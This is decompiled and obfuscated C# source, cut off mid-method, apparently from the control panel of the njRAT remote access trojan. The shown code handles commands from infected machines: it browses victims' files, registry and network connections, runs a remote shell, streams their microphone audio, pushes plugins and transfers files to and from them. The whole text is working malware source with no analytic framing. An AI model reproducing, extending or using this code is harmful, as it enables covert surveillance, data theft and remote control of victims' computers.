using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using njRAT;
using WinMM;

// Token: 0x0200000E RID: 14
[StandardModule]
internal sealed class \u000E\u2000
{
	// Token: 0x06000057 RID: 87 RVA: 0x0000657C File Offset: 0x0000477C
	public static \u000E\u2000.\u0003 \u0002(string \u0002, string \u0003)
	{
		if (\u0002 != null)
		{
			try
			{
				foreach (\u000E\u2000.\u0003 u in global::\u000E\u2000.\u000F\u2001)
				{
					if (Operators.CompareString(u.\u0003, \u0002.ToLower(), false) == 0)
					{
						return u;
					}
				}
			}
			finally
			{
				List<\u000E\u2000.\u0003>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}
		if (\u0003 != null)
		{
			try
			{
				foreach (\u000E\u2000.\u0003 u2 in global::\u000E\u2000.\u000F\u2001)
				{
					if (Operators.CompareString(u2.\u0005, \u0003, false) == 0)
					{
						return u2;
					}
				}
			}
			finally
			{
				List<\u000E\u2000.\u0003>.Enumerator enumerator2;
				((IDisposable)enumerator2).Dispose();
			}
		}
		return null;
	}

	// Token: 0x06000058 RID: 88 RVA: 0x00006658 File Offset: 0x00004858
	public static object \u0002(DataGridViewRow \u0002)
	{
		object result;
		try
		{
			if (\u0002 == null)
			{
				result = global::\u0006\u2001.\u0002(-1829128309);
			}
			else if (\u0002.Tag == null)
			{
				result = global::\u0006\u2001.\u0002(-1829128309);
			}
			else
			{
				result = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(global::\u0006\u2001.\u0002(-1829138726), \u0002.Cells[global::\u000E\u2000.\u0002\u2000].Value), global::\u0006\u2001.\u0002(-1829128317)), \u0002.Cells[global::\u000E\u2000.\u0008\u2000].Value), global::\u0006\u2001.\u0002(-1829128317)), \u0002.Cells[global::\u000E\u2000.\u0002\u2001].Value), global::\u0006\u2001.\u0002(-1829137371));
			}
		}
		catch (Exception ex)
		{
			result = global::\u0006\u2001.\u0002(-1829128309);
		}
		return result;
	}

	// Token: 0x06000059 RID: 89 RVA: 0x00006750 File Offset: 0x00004950
	public static bool \u0002(Client \u0002, \u000E\u2000.\u0003 \u0003, bool \u0005)
	{
		try
		{
			string text;
			if (\u0005)
			{
				text = global::\u0006\u2001.\u0002(-1829128293) + global::\u000E\u2000.\u000E + \u0003.\u0005 + global::\u000E\u2000.\u000E;
			}
			else
			{
				text = string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128303),
					global::\u000E\u2000.\u000E,
					\u0003.\u0005,
					global::\u000E\u2000.\u000E,
					\u0002.ip(),
					global::\u000E\u2000.\u000E
				});
			}
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(global::\u000E.\u0002(ref text), 0, text.Length);
			if (!\u0002.plg.Contains(\u0003.\u0005))
			{
				memoryStream.Write(\u0003.\u0002, 0, \u0003.\u0002.Length);
			}
			else
			{
				memoryStream.WriteByte(40);
			}
			\u0002.Send(memoryStream.ToArray());
			return true;
		}
		catch (Exception ex)
		{
		}
		return false;
	}

	// Token: 0x0600005A RID: 90 RVA: 0x00006860 File Offset: 0x00004A60
	public static Form \u0002(string \u0002)
	{
		return global::\u0005.\u0002().OpenForms[\u0002];
	}

	// Token: 0x0600005B RID: 91 RVA: 0x00006880 File Offset: 0x00004A80
	public static void \u0002(object \u0002)
	{
		IEnumerator enumerator = global::\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows.GetEnumerator();
		enumerator.Reset();
		byte[] b;
		if (NewLateBinding.LateIndexGet(\u0002, new object[]
		{
			0
		}, null) is string)
		{
			object[] array = new object[1];
			object[] array2 = array;
			int num = 0;
			int num2 = 0;
			array2[num] = num2;
			string text = Conversions.ToString(NewLateBinding.LateIndexGet(\u0002, array, null));
			byte[] array3 = global::\u000E.\u0002(ref text);
			NewLateBinding.LateIndexSetComplex(\u0002, new object[]
			{
				num2,
				text
			}, null, true, false);
			b = array3;
		}
		else
		{
			b = (byte[])NewLateBinding.LateIndexGet(\u0002, new object[]
			{
				0
			}, null);
		}
		while (enumerator.MoveNext())
		{
			object obj = enumerator.Current;
			DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
			Client client = (Client)dataGridViewRow.Tag;
			client.Send(b);
			DataGridViewCellStyle defaultCellStyle = dataGridViewRow.DefaultCellStyle;
			object obj2 = NewLateBinding.LateIndexGet(\u0002, new object[]
			{
				1
			}, null);
			Color color;
			defaultCellStyle.ForeColor = ((obj2 != null) ? ((Color)obj2) : color);
		}
	}

	// Token: 0x0600005C RID: 92 RVA: 0x000069B4 File Offset: 0x00004BB4
	public static void \u0003(object \u0002)
	{
		Client client = (Client)NewLateBinding.LateIndexGet(\u0002, new object[]
		{
			0
		}, null);
		byte[] array = (byte[])NewLateBinding.LateIndexGet(\u0002, new object[]
		{
			1
		}, null);
		string[] array2 = Strings.Split(global::\u000E.\u0002(ref array), global::\u000E\u2000.\u000E, -1, CompareMethod.Binary);
		checked
		{
			try
			{
				string left = array2[0];
				if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128217), false) == 0)
				{
					Manager manager = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
					if (manager != null)
					{
						manager.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = array2[1];
						if (array2[1].StartsWith(global::\u0006\u2001.\u0002(-1829128194)))
						{
							manager.shStarted = 0;
						}
					}
				}
				else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128208), false) == 0)
				{
					Manager manager2 = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
					if (manager2 != null)
					{
						string left2 = array2[1];
						if (Operators.CompareString(left2, global::\u0006\u2001.\u0002(-1829139089), false) == 0)
						{
							List<string> list = new List<string>();
							List<ListViewItem> list2 = new List<ListViewItem>();
							int num = 2;
							int num2 = array2.Length - 1;
							for (int i = num; i <= num2; i++)
							{
								string[] array3 = Strings.Split(array2[i], global::\u0006\u2001.\u0002(-1829128250), -1, CompareMethod.Binary);
								list.Add(array3[0].ToLower());
								if (manager2.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Items.ContainsKey(array3[0]))
								{
									ListViewItem listViewItem = manager2.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Items[array3[0]];
									listViewItem.SubItems[3].Text = array3[3];
									listViewItem.SubItems[4].Text = array3[4];
								}
								else
								{
									ListViewItem listViewItem = new ListViewItem(array3[0]);
									int num3 = 1;
									int num4 = array3.Length - 1;
									for (int j = num3; j <= num4; j++)
									{
										listViewItem.SubItems.Add(array3[j]);
									}
									listViewItem.Name = array3[0];
									list2.Add(listViewItem);
									if (list2.Count > 20)
									{
										manager2.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Items.AddRange(list2.ToArray());
										list2.Clear();
									}
								}
							}
							if (list2.Count > 0)
							{
								manager2.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Items.AddRange(list2.ToArray());
								list2.Clear();
							}
							List<string> list3 = new List<string>();
							try
							{
								foreach (object obj in manager2.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Items)
								{
									ListViewItem listViewItem2 = (ListViewItem)obj;
									if (!list.Contains(listViewItem2.Text.ToLower()))
									{
										list3.Add(listViewItem2.Text);
									}
								}
							}
							finally
							{
								IEnumerator enumerator;
								if (enumerator is IDisposable)
								{
									(enumerator as IDisposable).Dispose();
								}
							}
							try
							{
								foreach (string key in list3)
								{
									manager2.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Items.RemoveByKey(key);
								}
							}
							finally
							{
								List<string>.Enumerator enumerator2;
								((IDisposable)enumerator2).Dispose();
							}
							manager2.srvNxt = true;
							if (manager2.SrvFX)
							{
								manager2.SrvFX = false;
								manager2.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().\u0005();
							}
						}
					}
				}
				else
				{
					if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128228), false) == 0)
					{
						Manager manager3 = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
						if (manager3 == null)
						{
							return;
						}
						ToolStripProgressBar obj2 = manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
						lock (obj2)
						{
							string left3 = array2[1];
							if (Operators.CompareString(left3, global::\u0006\u2001.\u0002(-1829139089), false) == 0)
							{
								string[] array4 = Strings.Split(array2[2], global::\u0006\u2001.\u0002(-1829128238), -1, CompareMethod.Binary);
								manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
								manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Maximum = array4.Length;
								List<ListViewItem> list4 = new List<ListViewItem>();
								int num5 = 0;
								int num6 = array4.Length - 1;
								for (int k = num5; k <= num6; k++)
								{
									string[] array5 = Strings.Split(array4[k], global::\u0006\u2001.\u0002(-1829136748), -1, CompareMethod.Binary);
									if (manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Items.ContainsKey(array5[0] + array5[1]))
									{
										ListViewItem listViewItem3 = manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Items[array5[0] + array5[1]];
										listViewItem3.SubItems[4].Text = ((TcpState)Conversions.ToInteger(array5[2])).ToString();
										Color foreColor = listViewItem3.ForeColor;
										switch (Conversions.ToInteger(array5[2]))
										{
										case 1:
										case 8:
										case 9:
										case 11:
										case 12:
											listViewItem3.ForeColor = Color.Red;
											break;
										case 4:
											listViewItem3.ForeColor = Color.YellowGreen;
											break;
										case 5:
											listViewItem3.ForeColor = Color.LimeGreen;
											break;
										}
									}
									else
									{
										ListViewItem listViewItem4 = new ListViewItem(array5[0].Split(new char[]
										{
											':'
										})[0]);
										listViewItem4.Name = array5[0] + array5[1];
										listViewItem4.Tag = array5[0] + array5[1];
										listViewItem4.SubItems.Add(array5[0].Split(new char[]
										{
											':'
										})[1]);
										listViewItem4.SubItems.Add(array5[1].Split(new char[]
										{
											':'
										})[0]);
										listViewItem4.SubItems.Add(array5[1].Split(new char[]
										{
											':'
										})[1]);
										listViewItem4.SubItems.Add(((TcpState)Conversions.ToInteger(array5[2])).ToString());
										listViewItem4.SubItems.Add(array5[3]);
										switch (Conversions.ToInteger(array5[2]))
										{
										case 1:
										case 8:
										case 9:
										case 11:
										case 12:
											listViewItem4.ForeColor = Color.Red;
											break;
										case 3:
										case 4:
											listViewItem4.ForeColor = Color.YellowGreen;
											break;
										case 5:
											listViewItem4.ForeColor = Color.LimeGreen;
											break;
										}
										list4.Add(listViewItem4);
										if (list4.Count > 20)
										{
											manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Items.AddRange(list4.ToArray());
											list4.Clear();
											ColumnHeader u = manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().\u0006;
											if (u == null)
											{
												manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().\u0002(manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(), new ColumnClickEventArgs(0));
											}
											else
											{
												if (Operators.ConditionalCompareObjectEqual(u.Tag, global::\u0006\u2001.\u0002(-1829128662), false))
												{
													u.Tag = global::\u0006\u2001.\u0002(-1829128670);
												}
												else if (Operators.ConditionalCompareObjectEqual(u.Tag, global::\u0006\u2001.\u0002(-1829128670), false))
												{
													u.Tag = global::\u0006\u2001.\u0002(-1829128662);
												}
												else
												{
													u.Tag = global::\u0006\u2001.\u0002(-1829128670);
												}
												manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().\u0002(manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(), new ColumnClickEventArgs(u.Index));
											}
										}
									}
								}
								if (manager3.TCPFX)
								{
									manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().\u0005();
									manager3.TCPFX = false;
								}
								if (list4.Count > 0)
								{
									manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Items.AddRange(list4.ToArray());
									list4.Clear();
									ColumnHeader u2 = manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().\u0006;
									if (u2 == null)
									{
										manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().\u0002(manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(), new ColumnClickEventArgs(0));
									}
									else
									{
										if (Operators.ConditionalCompareObjectEqual(u2.Tag, global::\u0006\u2001.\u0002(-1829128662), false))
										{
											u2.Tag = global::\u0006\u2001.\u0002(-1829128670);
										}
										else if (Operators.ConditionalCompareObjectEqual(u2.Tag, global::\u0006\u2001.\u0002(-1829128670), false))
										{
											u2.Tag = global::\u0006\u2001.\u0002(-1829128662);
										}
										else
										{
											u2.Tag = global::\u0006\u2001.\u0002(-1829128670);
										}
										manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().\u0002(manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(), new ColumnClickEventArgs(u2.Index));
									}
								}
								manager3.TCPNXT = true;
								return;
							}
							if (Operators.CompareString(left3, global::\u0006\u2001.\u0002(-1829128646), false) == 0)
							{
								int num7 = 2;
								int num8 = array2.Length - 1;
								for (int l = num7; l <= num8; l++)
								{
									manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Items.RemoveByKey(array2[l]);
								}
								return;
							}
							if (Operators.CompareString(left3, global::\u0006\u2001.\u0002(-1829131567), false) == 0)
							{
								manager3.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = array2[2];
							}
							return;
						}
					}
					if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128655), false) == 0)
					{
						if (client.osk == null)
						{
							client.isPL = true;
							try
							{
								client.osk = global::\u000E\u2000.\u0005.GetClient(array2[1]);
							}
							catch (Exception ex)
							{
								client.CN = false;
							}
						}
						if (global::\u000E\u2000.\u000F.InvokeRequired)
						{
							global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
							{
								RuntimeHelpers.GetObjectValue(\u0002)
							});
						}
						else
						{
							Mic mic = (Mic)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137090) + client.ip());
							string left4 = array2[2];
							if (Operators.CompareString(left4, global::\u0006\u2001.\u0002(-1829139089), false) == 0)
							{
								if (mic == null)
								{
									mic = new Mic();
									mic.Name = global::\u0006\u2001.\u0002(-1829137090) + client.ip();
									mic.sk = client;
									mic.osk = client.osk;
									int num9 = 3;
									int num10 = array2.Length - 1;
									for (int m = num9; m <= num10; m++)
									{
										mic.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Items.Add(array2[m]);
									}
									mic.Show();
								}
							}
							else if (Operators.CompareString(left4, global::\u0006\u2001.\u0002(-1829138798), false) == 0)
							{
								if (mic == null)
								{
									client.CN = false;
								}
								else
								{
									byte[] array6 = (byte[])NewLateBinding.LateIndexGet(global::\u000E.\u0002(array, array2[3] + global::\u000E\u2000.\u000E), new object[]
									{
										1
									}, null);
									if (array6[0] == 31)
									{
										byte[] u3 = array6;
										bool flag = false;
										array6 = global::\u000E.\u0002(u3, ref flag);
									}
									mic.Text = global::\u000E.\u0002(unchecked((long)array6.Length)) + global::\u0006\u2001.\u0002(-1829139381) + mic.QQ;
									if (Conversions.ToInteger(array2[3]) == 0)
									{
										global::\u000E\u2000.\u0008\u2002.Write(array6);
									}
									else
									{
										global::\u000E\u2000.\u0006\u2002.Write(array6);
									}
								}
							}
							else if (Operators.CompareString(left4, global::\u0006\u2001.\u0002(-1829131567), false) == 0)
							{
								if (mic == null)
								{
									client.CN = false;
								}
								else
								{
									mic.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Enabled = true;
									mic.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0003().Enabled = true;
									mic.8j3b35wggv7myhr7y5hvz6qsd7mlp7vg\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829138894);
								}
							}
						}
					}
					else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128697), false) == 0)
					{
						client.isPL = true;
						client.t.Dispose();
						client.CN = false;
						client.NoPing = true;
						up up = (up)global::\u000E\u2000.\u0002(array2[1] + array2[2]);
						if (up == null)
						{
							client.Close();
						}
						else
						{
							up.sk = client;
							int num11 = 0;
							client.Client.SendBufferSize = 524288;
							try
							{
								while (num11 != up.SZ)
								{
									if (up.Closing)
									{
										goto IL_D48;
									}
									byte[] array7 = new byte[10241];
									int num12 = up.FS.Read(array7, 0, array7.Length);
									client.Client.Client.Poll(-1, SelectMode.SelectWrite);
									client.Client.Client.Send(array7, 0, num12, SocketFlags.None);
									num11 += num12;
									global::\u000E\u2000.\u0008 += unchecked((long)num12);
									ProgressBar progressBar = up.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002();
									progressBar.Value += num12;
								}
								up.Close();
							}
							catch (Exception ex2)
							{
								try
								{
									up.Text = global::\u0006\u2001.\u0002(-1829128675);
									up.4za99z765gwdfmevzxqdcpn9zt6z7ml6\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.Red;
								}
								catch (Exception ex3)
								{
								}
							}
							IL_D48:
							client.Close();
						}
					}
					else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128601), false) == 0)
					{
						client.isPL = true;
						DW dw = new DW();
						dw.FN = array2[1];
						dw.SZ = Conversions.ToInteger(array2[2]);
						dw.c = client;
						dw.osk = client.osk;
						dw.Name = dw.osk.ip() + array2[1];
						dw.Show();
					}
					else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128581), false) == 0)
					{
						client.osk = global::\u000E\u2000.\u0005.GetClient(array2[3]);
						try
						{
							client.t.Dispose();
							client.CN = false;
							client.NoPing = true;
							object[] array8 = new object[2];
							array8[0] = 1;
							object[] array9 = array8;
							int num13 = 1;
							string text = string.Concat(new string[]
							{
								global::\u0006\u2001.\u0002(-1829128601),
								global::\u000E\u2000.\u000E,
								array2[1],
								global::\u000E\u2000.\u000E,
								array2[2],
								global::\u000E\u2000.\u000E,
								array2[3]
							});
							array9[num13] = global::\u000E.\u0002(ref text);
							NewLateBinding.LateIndexSet(\u0002, array8, null);
							global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
							{
								RuntimeHelpers.GetObjectValue(\u0002)
							});
							int num14 = 0;
							while (global::\u000E\u2000.\u0002(array2[3] + array2[1]) == null)
							{
								num14++;
								if (num14 == 1000)
								{
									return;
								}
								Thread.Sleep(10);
							}
							Socket client2 = client.Client.Client;
							text = global::\u0006\u2001.\u0002(-1829128592);
							client2.Send(global::\u000E.\u0002(ref text), 0, 2, SocketFlags.None);
							client.Client.Client.ReceiveBufferSize = 1048576;
							global::\u000E\u2000.\u0008 += 2L;
							byte[] array10 = new byte[1025];
							DW dw2 = (DW)global::\u000E\u2000.\u0002(array2[3] + array2[1]);
							int num15 = 0;
							try
							{
								for (;;)
								{
									array10 = new byte[1048577];
									client.Client.Client.Poll(-1, SelectMode.SelectRead);
									int num16 = client.Client.Client.Receive(array10, 0, array10.Length, SocketFlags.None);
									dw2.FS.Write(array10, 0, num16);
									global::\u000E\u2000.\u0006 += unchecked((long)num16);
									num15 += num16;
									ProgressBar progressBar = dw2.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002();
									progressBar.Value += num16;
									dw2.FS.Flush();
									if (num15 == dw2.SZ)
									{
										break;
									}
									Thread.Sleep(1);
								}
								dw2.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Enabled = false;
								dw2.FS.Close();
								dw2.FS.Dispose();
								if (File.Exists(dw2.folder))
								{
									File.Delete(dw2.folder);
								}
								File.Move(dw2.tmp, dw2.folder);
								dw2.Close();
							}
							catch (Exception ex4)
							{
								dw2.Text = global::\u0006\u2001.\u0002(-1829128633);
								dw2.ForeColor = Color.Red;
							}
						}
						catch (Exception ex5)
						{
						}
						client.Close();
					}
					else
					{
						if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128623), false) == 0)
						{
							if (global::\u000E\u2000.\u000F.InvokeRequired)
							{
								global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
								{
									RuntimeHelpers.GetObjectValue(\u0002)
								});
								return;
							}
							Manager manager4 = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
							ToolStripProgressBar obj3 = manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
							lock (obj3)
							{
								string left5 = array2[1];
								if (Operators.CompareString(left5, global::\u0006\u2001.\u0002(-1829131567), false) == 0)
								{
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = true;
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = true;
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = global::\u000E.\u0003(array2[2]);
									return;
								}
								if (Operators.CompareString(left5, global::\u0006\u2001.\u0002(-1829139089), false) == 0)
								{
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = true;
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = true;
									TreeNodeCollection nodes = manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Nodes;
									TreeNode treeNode = global::\u000E.\u0002(array2[2], manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Nodes);
									List<string> list5 = new List<string>();
									if (manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode == treeNode)
									{
										manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Clear();
									}
									Manager.\u0002 u4;
									if (manager4.RGCH.Contains(array2[2]))
									{
										u4 = (Manager.\u0002)manager4.RGCH[array2[2]];
										u4.\u0003.Clear();
										u4.\u0005.Clear();
									}
									else
									{
										u4 = new Manager.\u0002();
										u4.\u0002 = array2[2];
										manager4.RGCH.Add(u4, array2[2], null, null);
									}
									string[] array11 = Strings.Split(array2[3], global::\u0006\u2001.\u0002(-1829128250), -1, CompareMethod.Binary);
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Maximum = array11.Length;
									foreach (string text2 in array11)
									{
										if (Operators.CompareString(text2, string.Empty, false) != 0)
										{
											string[] array13 = Strings.Split(text2, global::\u0006\u2001.\u0002(-1829128536), -1, CompareMethod.Binary);
											try
											{
												ToolStripProgressBar toolStripProgressBar = manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
												toolStripProgressBar.Value++;
												if (array13.Length > 1)
												{
													if (manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode == treeNode)
													{
														ListViewItem listViewItem5 = manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Add(array13[0]);
														listViewItem5.SubItems.Add(array13[1]);
														listViewItem5.SubItems.Add(array13[2]);
														if (Operators.CompareString(array13[1], global::\u0006\u2001.\u0002(-1829128514), false) == 0)
														{
															listViewItem5.ImageIndex = 1;
														}
														else
														{
															listViewItem5.ImageIndex = 2;
														}
													}
													u4.\u0003.Add(array13);
												}
												else
												{
													u4.\u0005.Add(array13[0]);
													treeNode.Nodes.Add(array13[0], array13[0]);
													if (!treeNode.Nodes.ContainsKey(array13[0]))
													{
														list5.Add(array13[0]);
													}
												}
											}
											catch (Exception ex6)
											{
											}
										}
									}
									try
									{
										foreach (object obj4 in treeNode.Nodes)
										{
											TreeNode treeNode2 = (TreeNode)obj4;
											if (list5.Contains(treeNode2.Text))
											{
												list5.Remove(treeNode2.Text);
											}
										}
									}
									finally
									{
										IEnumerator enumerator3;
										if (enumerator3 is IDisposable)
										{
											(enumerator3 as IDisposable).Dispose();
										}
									}
									try
									{
										foreach (string key2 in list5)
										{
											treeNode.Nodes.RemoveByKey(key2);
										}
									}
									finally
									{
										List<string>.Enumerator enumerator4;
										((IDisposable)enumerator4).Dispose();
									}
									if (treeNode == manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode)
									{
										treeNode.Expand();
									}
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().\u0005();
									manager4.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
								}
								return;
							}
						}
						if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128527), false) == 0)
						{
							Manager manager5 = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
							if (manager5 != null)
							{
								manager5.shStarted = 2;
								manager5.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ReadOnly = false;
								manager5.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
							}
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128569), false) == 0)
						{
							Manager manager6 = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
							if (manager6 != null)
							{
								RichTextBox obj5 = manager6.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
								lock (obj5)
								{
									manager6.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectionStart = manager6.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TextLength;
									manager6.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().AppendText(global::\u000E.\u0003(array2[1].Replace(global::\u0006\u2001.\u0002(-1829139159), string.Empty)) + global::\u0006\u2001.\u0002(-1829139159));
									manager6.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectionStart = manager6.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TextLength;
									manager6.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ScrollToCaret();
								}
							}
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128546), false) == 0)
						{
							Manager manager7 = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
							if (manager7 != null)
							{
								manager7.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ReadOnly = true;
								manager7.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Gray;
								manager7.shStarted = 0;
							}
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128556), false) == 0)
						{
							\u000E\u2000.\u0003 u5 = global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829128470), null);
							MemoryStream memoryStream = new MemoryStream();
							string text = global::\u0006\u2001.\u0002(-1829128556) + global::\u000E\u2000.\u000E;
							array = global::\u000E.\u0002(ref text);
							memoryStream.Write(array, 0, array.Length);
							memoryStream.Write(u5.\u0002, 0, u5.\u0002.Length);
							client.Send(memoryStream.ToArray());
						}
						else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128452), false) == 0)
						{
							if (client.osk == null)
							{
								client.isPL = true;
								try
								{
									client.osk = global::\u000E\u2000.\u0005.GetClient(array2[1]);
								}
								catch (Exception ex7)
								{
									client.CN = false;
								}
							}
							if (global::\u000E\u2000.\u000F.InvokeRequired)
							{
